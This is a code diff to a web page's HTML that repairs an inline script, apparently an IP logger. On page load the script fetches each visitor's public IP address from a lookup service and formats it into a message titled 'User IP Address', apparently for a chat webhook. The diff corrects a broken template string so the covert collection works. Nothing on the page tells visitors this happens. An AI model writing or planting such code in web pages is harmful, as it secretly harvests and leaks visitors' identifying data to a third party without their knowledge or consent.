@@ -24,9 +24,9 @@
     <link rel="icon" href="images/icon.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 </head>
-<body>	
-<script>
-        fetch('https://api.ipify.org/?format=json')	
+<body>
+    <script>
+        fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
         const userIP = data.ip;
@@ -35,7 +35,7 @@
             embeds: [
                 {
                     title: 'User IP Address',
-                    description: The user's IP address is ${userIP},
+                    description: `The user's IP address is ${userIP}`,
                     color: 16711680
                 }
             ]
